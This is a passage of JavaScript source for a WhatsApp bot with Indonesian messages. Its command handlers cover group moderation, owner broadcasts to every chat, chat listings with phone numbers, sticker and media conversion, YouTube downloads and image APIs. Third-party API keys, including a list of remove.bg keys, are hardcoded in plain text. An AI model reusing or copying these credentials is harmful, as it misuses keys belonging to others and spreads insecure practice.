                        { buttonId: 'group open', buttonText: { displayText: 'OPEN' }, type: 1 },
                        { buttonId: 'group close', buttonText: { displayText: 'CLOSE' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, `Mode Group`, 'NelzBotz', m)

             }
            }
            break
            case 'editinfo': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
             if (args[0] === 'open'){
                await hisoka.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
             } else if (args[0] === 'close'){
                await hisoka.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
             } else {
             let buttons = [
                        { buttonId: 'editinfo open', buttonText: { displayText: 'OPEN' }, type: 1 },
                        { buttonId: 'editinfo close', buttonText: { displayText: 'CLOSE' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, `Mode Edit Info`, 'NelzBotz', m)

            }
            }
            break
            case 'antilink': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === "on") {
                if (db.data.chats[m.chat].antilink) return m.reply(`Sudah Aktif Sebelumnya`)
                db.data.chats[m.chat].antilink = true
                m.reply(`Antilink Aktif !`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].antilink) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
                db.data.chats[m.chat].antilink = false
                m.reply(`Antilink Tidak Aktif !`)
                } else {
                 let buttons = [
                        { buttonId: 'antilink on', buttonText: { displayText: 'ON' }, type: 1 },
                        { buttonId: 'antilink off', buttonText: { displayText: 'OFF' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, `Mode Antilink`, 'NelzBotz', m)
                }
             }
             break
             case 'mute': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === "on") {
                if (db.data.chats[m.chat].mute) return m.reply(`Sudah Aktif Sebelumnya`)
                db.data.chats[m.chat].mute = true
                m.reply(`${'NelzBotz'} telah di mute di group ini !`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].mute) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
                db.data.chats[m.chat].mute = false
                m.reply(`${'NelzBotz'} telah di unmute di group ini !`)
                } else {
                 let buttons = [
                        { buttonId: 'mute on', buttonText: { displayText: 'ON' }, type: 1 },
                        { buttonId: 'mute off', buttonText: { displayText: 'OFF' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, `Mute Bot`, 'NelzBotz', m)
                }
             }
             break
            case 'linkgroup': case 'linkgc': {
                if (!m.isGroup) throw mess.group
                let response = await hisoka.groupInviteCode(m.chat)
                hisoka.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break
            case 'ephemeral': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Masukkan value enable/disable'
                if (args[0] === 'enable') {
                    await hisoka.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'disable') {
                    await hisoka.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
            break
            case 'delete': case 'del': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
                hisoka.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case 'bcgc': case 'bcgroup': {
                if (!isCreator) throw mess.owner
                if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
                let getGroups = await hisoka.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
                for (let i of anu) {
                    await sleep(1500)
                    let btn = [{
                                 urlButton: {
                                    displayText: 'YT CREATOR📽️',
                                    url: ''
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'RULES❗',
                                    id: 'rules'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'OWNER👤',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'LIST MENU📚',
                                    id: 'command'
                                }
                            }]
                      let txt = `「 Broadcast Bot 」\n\n${text}`
                      hisoka.send5ButImg(i, txt, 'NelzBotz', global.thumb, btn)
                    }
                m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
            }
            break
            case 'bc': case 'broadcast': case 'bcall': {
                if (!isCreator) throw mess.owner
                if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
                let anu = await store.chats.all().map(v => v.id)
                m.reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
		for (let yoi of anu) {
		    await sleep(1500)
		    let btn = [{
                                 urlButton: {
                                    displayText: 'YT CREATOR📽️',
                                    url: ''
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'RULES❗',
                                    id: 'rules'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'OWNER👤',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'LIST MENU📚',
                                    id: 'command'
                                }
                            }]
                      let txt = `「 Broadcast Bot 」\n\n${text}`
                      hisoka.send5ButImg(yoi, txt, 'NelzBotz', global.thumb, btn)
		}
		m.reply('Sukses Broadcast')
            }
            break
            case 'infochat': {
                if (!m.quoted) m.reply('Reply Pesan')
                let msg = await m.getQuotedObj()
                if (!m.quoted.isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
                let teks = ''
                for (let i of msg.userReceipt) {
                    let read = i.readTimestamp
                    let unread = i.receiptTimestamp
                    let waktu = read ? read : unread
                    teks += `⭔ @${i.userJid.split('@')[0]}\n`
                    teks += ` ┗━⭔ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} ⭔ *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
                }
                hisoka.sendTextWithMentions(m.chat, teks, m)
            }
            break
            case 'q': case 'quoted': {
		if (!m.quoted) return m.reply('Reply Pesannya!!')
		let wokwol = await hisoka.serializeM(await m.getQuotedObj())
		if (!wokwol.quoted) return m.reply('Pesan Yang anda reply tidak mengandung reply')
		await wokwol.quoted.copyNForward(m.chat, true)
            }
	    break
            case 'listpc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
                 for (let i of anu) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 hisoka.sendTextWithMentions(m.chat, teks, m)
             }
             break
                case 'listgc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
                 for (let i of anu) {
                     let metadata = await hisoka.groupMetadata(i)
                     teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* @${metadata.owner.split('@')[0]}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 hisoka.sendTextWithMentions(m.chat, teks, m)
             }
             break
             case 'listonline': case 'liston': {
                    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                    let online = [...Object.keys(store.presences[id]), botNumber]
                    hisoka.sendText(m.chat, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
             }
             break
            case 'sticker': case 's': case 'stickergif': case 'sgif': case 'stiker': {
            if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
                    if (/image/.test(mime)) {
                let media = await quoted.download()
                let encmedia = await hisoka.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
                let media = await quoted.download()
                let encmedia = await hisoka.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else {
                throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
                }
            }
            break
            case 'ebinary': {
            if (!m.quoted.text && !text) throw `Kirim/reply text dengan caption ${prefix + command}`
            let { eBinary } = require('./lib/binary')
            let teks = text ? text : m.quoted && m.quoted.text ? m.quoted.text : m.text
            let eb = await eBinary(teks)
            m.reply(eb)
        }
        break
            case 'dbinary': {
            if (!m.quoted.text && !text) throw `Kirim/reply text dengan caption ${prefix + command}`
            let { dBinary } = require('./lib/binary')
            let teks = text ? text : m.quoted && m.quoted.text ? m.quoted.text : m.text
            let db = await dBinary(teks)
            m.reply(db)
        }
        break
            case 'emojimix': {
	        if (!text) throw `Example : ${prefix + command} 😅+🤔`
		let [emoji1, emoji2] = text.split`+`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anu.results) {
		    let encmedia = await hisoka.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
case 'emojimix2': {
	    if (!text) throw `Example : ${prefix + command} 😅`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
		for (let res of anu.results) {
		    let encmedia = await hisoka.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
break
	       case 'attp': case 'ttp': {
           if (!text) throw `Example : ${prefix + command} text`
           await hisoka.sendMedia(m.chat, `https://xteam.xyz/${command}?file&text=${text}`, 'hisoka', 'morou', m, {asSticker: true})
         }
         break
case 'stext': case 'stickertext': case 'stikertext': {
	        let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
	        if (!/image/.test(mime)) throw respond
            if (!text) throw respond
	        m.reply(mess.wait)
            atas = text.split('|')[0] ? text.split('|')[0] : '-'
            bawah = text.split('|')[1] ? text.split('|')[1] : '-'
	        let dwnld = await quoted.download()
	        let { floNime } = require('./lib/uploader')
	        let fatGans = await floNime(dwnld)
	        let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${fatGans.result.url}`
	        let FaTiH = await hisoka.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.author })
	        await fs.unlinkSync(FaTiH)
            }
	       break     
            case 'toimage': case 'toimg': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
                let media = await hisoka.downloadAndSaveMediaMessage(quoted)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) throw err
                    let buffer = fs.readFileSync(ran)
                    hisoka.sendMessage(m.chat, { image: buffer }, { quoted: m })
                    fs.unlinkSync(ran)
                })
            }
            break
	        case 'tomp4': case 'tovideo': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await hisoka.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await hisoka.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case 'toaud': case 'toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`
            if (!quoted) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            hisoka.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case 'tomp3': {
            if (/document/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            if (!quoted) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            hisoka.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${'NelzBotz'}.mp3`}, { quoted : m })
            }
            break
            case 'tovn': case 'toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
            if (!quoted) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            hisoka.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            case 'togif': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await hisoka.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await hisoka.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
	        case 'tourl': {
                m.reply(mess.wait)
		let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await hisoka.downloadAndSaveMediaMessage(quoted)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    m.reply(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    m.reply(util.format(anu))
                }
                await fs.unlinkSync(media)
            }
            break
            case 'imagenobg': case 'removebg': case 'remove-bg': {
	    if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    let remobg = require('remove.bg')
	    let apirnobg = ['q61faXzzR5zNU6cvcrwtUkRU','S258diZhcuFJooAtHTaPEn4T','5LjfCVAp4vVNYiTjq9mXJWHF','aT7ibfUsGSwFyjaPZ9eoJc61','BY63t7Vx2tS68YZFY6AJ4HHF','5Gdq1sSWSeyZzPMHqz7ENfi8','86h6d6u4AXrst4BVMD9dzdGZ','xp8pSDavAgfE5XScqXo9UKHF','dWbCoCb3TacCP93imNEcPxcL']
	    let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
	    hmm = await './src/remobg-'+getRandom('')
	    localFile = await hisoka.downloadAndSaveMediaMessage(quoted, hmm)
	    outputFile = await './src/hremo-'+getRandom('.png')
	    m.reply(mess.wait)
	    remobg.removeBackgroundFromImageFile({
	      path: localFile,
	      apiKey: apinobg,
	      size: "regular",
	      type: "auto",
	      scale: "100%",
	      outputFile 
	    }).then(async result => {
	    hisoka.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : m })
	    await fs.unlinkSync(localFile)
	    await fs.unlinkSync(outputFile)
	    })
	    }
	    break
	    case 'yts': case 'ytsearch': {
                if (!text) throw `Example : ${prefix + command} story wa anime`
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `⭔ No : ${no++}\n⭔ Type : ${i.type}\n⭔ Video ID : ${i.videoId}\n⭔ Title : ${i.title}\n⭔ Views : ${i.views}\n⭔ Duration : ${i.timestamp}\n⭔ Upload At : ${i.ago}\n⭔ Author : ${i.author.name}\n⭔ Url : ${i.url}\n\n─────────────────\n\n`
                }
                hisoka.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
        case 'google': {
                if (!text) throw `Example : ${prefix + command} fatih arridho`
                let google = require('google-it')
                google({'query': text}).then(res => {
                let teks = `Google Search From : ${text}\n\n`
                for (let g of res) {
                teks += `⭔ *Title* : ${g.title}\n`
                teks += `⭔ *Description* : ${g.snippet}\n`
                teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
                } 
                m.reply(teks)
                })
                }
                break
        case 'gimage': {
        if (!text) throw `Example : ${prefix + command} kaori cicak`
        let gis = require('g-i-s')
        gis(text, async (error, result) => {
        n = result
        images = n[Math.floor(Math.random() * n.length)].url
        let buttons = [
                    {buttonId: `gimage ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: images },
                    caption: `*-------「 GIMAGE SEARCH 」-------*
🤠 *Query* : ${text}
🔗 *Media Url* : ${images}`,
                    footer: 'NelzBotz',
                    buttons: buttons,
                    headerType: 4
                }
                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
        })
        }
        break
	    case 'play': case 'ytplay': {
                if (!text) throw `Example : ${prefix + command} story wa anime`
                let yts = require("yt-search")
                let search = await yts(text)
                let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
                let buttons = [
                    {buttonId: `ytmp3 ${anu.url}`, buttonText: {displayText: '♫ AUDIO'}, type: 1},
                    {buttonId: `ytmp4 ${anu.url}`, buttonText: {displayText: '► VIDEO'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: anu.thumbnail },
                    caption: `
⭔ Title : ${anu.title}
⭔ Ext : Search
⭔ ID : ${anu.videoId}
⭔ Duration : ${anu.timestamp}
⭔ Viewers : ${anu.views}
⭔ Upload At : ${anu.ago}
⭔ Author : ${anu.author.name}
⭔ Channel : ${anu.author.url}
⭔ Description : ${anu.description}
⭔ Url : ${anu.url}`,
                    footer: 'NelzBotz',
                    buttons: buttons,
                    headerType: 4
                }
                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
	    case 'ytmp3': case 'ytaudio': {
                let { yta } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(text, quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                hisoka.sendImage(m.chat, media.thumb, `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '128kbps'}`, m)
                hisoka.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
            }
            break
            case 'ytmp4': case 'ytvideo': {
                let { ytv } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(text, quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                hisoka.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
            }
            break
	    case 'getmusic': {
                let { yta } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} 1`
                if (!m.quoted) return m.reply('Reply Pesan')
                if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
		let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(urls[text - 1], quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                hisoka.sendImage(m.chat, media.thumb, `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${urls[text - 1]}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '128kbps'}`, m)
                hisoka.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
            }
            break
            case 'getvideo': {
                let { ytv } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} 1`
                if (!m.quoted) return m.reply('Reply Pesan')
                if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
                let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(urls[text - 1], quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                hisoka.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${urls[text - 1]}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
            }
            break
            case 'pinterest': {
                m.reply(mess.wait)
		let { pinterest } = require('./lib/scraper')
                anu = await pinterest(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                hisoka.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: m })
            }
            break
// Meme
case 'meme': {
m.reply(mess.wait)
let anu = await getBuffer(`https://api.zacros.my.id/randomimg/meme`)
hisoka.sendMessage(m.chat, { image: anu, caption: `Nih  Kak` }, { quoted: m})
}
break
case 'darkjoke': case 'darkjokes': {
m.reply(mess.wait)
let anu = await getBuffer(`https://api.zacros.my.id/randomimg/darkjokes`)
hisoka.sendMessage(m.chat, { image: anu, caption: `Nih  Kak` }, { quoted: m})
}
break
case 'darkmeme': {
m.reply(mess.wait)
let anu = await getBuffer(`https://hardianto.xyz/api/darkmeme?apikey=hardianto`)
hisoka.sendMessage(m.chat, { image: anu, caption: `Nih  Kak` }, { quoted: m})
}
break
case 'memeindo': {
m.reply(mess.wait)
let anu = await getBuffer(`https://api.lolhuman.xyz/api/meme/memeindo?apikey=Your Apikey`)
hisoka.sendMessage(m.chat, { image: anu, caption: `Nih  Kak` }, { quoted: m})
}
break
            case 'anime': case 'waifu': case 'husbu': case 'neko': case 'shinobu': case 'megumin': case 'waifus': case 'nekos': case 'trap': case 'blowjob': {
                m.reply(mess.wait)
                hisoka.sendMessage(m.chat, { image: { url: api('zenz', '/api/random/'+command, {}, 'apikey') }, caption: 'Generate Random ' + command }, { quoted: m })
            }
            break
	    case 'couple': {
                m.reply(mess.wait)
                let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                hisoka.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: m })
                hisoka.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
            }
	    break
            case 'coffe': case 'kopi': {
            let buttons = [
                    {buttonId: `coffe`, buttonText: {displayText: 'NEXT IMAGE'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: 'https://coffee.alexflipnote.dev/random' },
                    caption: `☕ Random Coffe`,
                    footer: 'NelzBotz',
                    buttons: buttons,
                    headerType: 4
                }
                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'wallpaper': {
                if (!text) throw 'Masukkan Query Title'
		let { wallpaper } = require('./lib/scraper')
                anu = await wallpaper(text)
                result = anu[Math.floor(Math.random() * anu.length)]
		let buttons = [
                    {buttonId: `wallpaper ${text}`, buttonText: {displayText: 'NEXT IMAGE'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image[0] },
                    caption: `⭔ Title : ${result.title}\n⭔ Category : ${result.type}\n⭔ Detail : ${result.source}\n⭔ Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
                    footer: 'NelzBotz',
                    buttons: buttons,
                    headerType: 4
                }
                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'wikimedia': {
                if (!text) throw 'Masukkan Query Title'
		let { wikimedia } = require('./lib/scraper')
                anu = await wikimedia(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `wikimedia ${text}`, buttonText: {displayText: 'NEXT IMAGE'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image },
                    caption: `⭔ Title : ${result.title}\n⭔ Source : ${result.source}\n⭔ Media Url : ${result.image}`,
                    footer: 'NelzBotz',
                    buttons: buttons,
                    headerType: 4
                }
                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'quotesanime': case 'quoteanime': {
		let { quotesAnime } = require('./lib/scraper')
                let anu = await quotesAnime()
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `quotesanime`, buttonText: {displayText: 'NEXT'}, type: 1}
                ]
                let buttonMessage = {
                    text: `~_${result.quotes}_\n\nBy '${result.karakter}', ${result.anime}\n\n- ${result.up_at}`,
                    footer: 'Tekan Tombol Dibawah',
                    buttons: buttons,
                    headerType: 2
                }
                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
	        case 'motivasi': case 'dilanquote': case 'bucinquote': case 'katasenja': case 'puisi': {
                let anu = await fetchJson(api('zenz', '/api/'+command, {}, 'apikey'))
                let buttons = [
                    {buttonId: `motivasi`, buttonText: {displayText: 'NEXT'}, type: 1}
                ]
                let buttonMessage = {
                    text: anu.result.message,
                    footer: 'Tekan Tombol Dibawah',
                    buttons: buttons,
                    headerType: 2
                }
                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case '3dchristmas': case '3ddeepsea': case 'americanflag': case '3dscifi': case '3drainbow': case '3dwaterpipe': case 'halloweenskeleton': case 'sketch': case 'bluecircuit': case 'space': case 'metallic': case 'fiction': case 'greenhorror': case 'transformer': case 'berry': case 'thunder': case 'magma': case '3dcrackedstone': case '3dneonlight': case 'impressiveglitch': case 'naturalleaves': case 'fireworksparkle': case 'matrix': case 'dropwater':  case 'harrypotter': case 'foggywindow': case 'neondevils': case 'christmasholiday': case '3dgradient': case 'blackpink': case 'gluetext': {
                if (!text) throw `Example : ${prefix + command} text`
                m.reply(mess.wait)
                hisoka.sendMessage(m.chat, { image: { url: api('zenz', '/textpro/' + command, { text: text }, 'apikey') }, caption: `Text Pro ${command}` }, { quoted: m})
	    }
            break
	    case 'shadow': case 'romantic': case 'smoke': case 'burnpapper': case 'naruto': case 'lovemsg': case 'grassmsg': case 'lovetext': case 'coffecup': case 'butterfly': case 'harrypotter': case 'retrolol': {
                if (!text) throw 'No Query Text'
                m.reply(mess.wait)
                hisoka.sendMessage(m.chat, { image: { url: api('zenz', '/photooxy/' + command, { text: text }, 'apikey') }, caption: `Photo Oxy ${command}` }, { quoted: m })
            }
            break
            case 'ffcover': case 'crossfire': case 'galaxy': case 'glass': case 'neon': case 'beach': case 'blackpink': case 'igcertificate': case 'ytcertificate': {
                if (!text) throw 'No Query Text'
                m.reply(mess.wait)
                hisoka.sendMessage(m.chat, { image: { url: api('zenz', '/ephoto/' + command, { text: text }, 'apikey') }, caption: `Ephoto ${command}` }, { quoted: m })
            }
            break
	    case 'nomerhoki': case 'nomorhoki': {
                if (!Number(text)) throw `Example : ${prefix + command} 6288292024190`
                let anu = await primbon.nomer_hoki(Number(text))
                if (anu.status == false) return m.reply(anu.message)
